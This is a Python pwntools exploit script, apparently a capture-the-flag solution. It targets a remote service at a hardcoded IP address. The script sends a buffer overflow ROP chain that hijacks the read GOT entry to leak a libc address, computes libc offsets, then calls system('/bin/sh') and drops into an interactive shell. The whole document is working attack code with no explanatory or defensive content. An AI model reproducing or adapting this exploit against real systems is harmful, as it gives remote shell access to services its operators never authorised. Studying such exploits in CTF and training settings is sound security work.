from pwn import *

#s = process("/root/start_hard")
s = remote("128.199.152.175",10001)

main = 0x0000000000400526
read_plt = 0x400400
read_got = 0x0000000000601018
libc_start_got = 0x0000000000601020
libc_start_plt = 0x0000000000400410
poprdi = 0x00000000004005c3
poprsi_r15 = 0x00000000004005c1

payload  = 'a'*0x10 + 'b'*8
payload += p64(poprdi) + p64(0) + p64(poprsi_r15) + p64(libc_start_got) + p64(0)            #backup read to libc_start_main
payload += p64(read_plt) + p64(poprdi) + p64(0) + p64(poprsi_r15) + p64(read_got) + p64(0)  #read overwrite to write
payload += p64(read_plt) + p64(poprdi) + p64(1) +p64(poprsi_r15) + p64(read_got) + p64(0)   #leak libc
payload += p64(read_plt) + p64(poprdi) + p64(0) + p64(poprsi_r15) + p64(read_got) + p64(0)  #rebuild read_got and go to main
payload += p64(libc_start_plt) + p64(main)

print "payload len : "+hex(len(payload))
s.send(payload.ljust(0x400,'\x00'))
s.send(p64(0x0000000000400406).ljust(0x400,'\x00'))          #read backup
s.send('\xd0')                                               #read overwrite to write

libc_write = u64(s.recvn(8))
libc_base  = libc_write - 0x00000000000f66d0
libc_system = libc_base + 0x0000000000045390
libc_binsh = libc_base + 0x18C177
print "libc_base : "+hex(libc_base)
s.recv(1024)
s.send(p64(0x0000000000400406))

payload  = 'a'*0x10 + 'b'*8
payload += p64(poprdi) + p64(libc_binsh)
payload += p64(libc_system)
s.send(payload)

s.interactive()

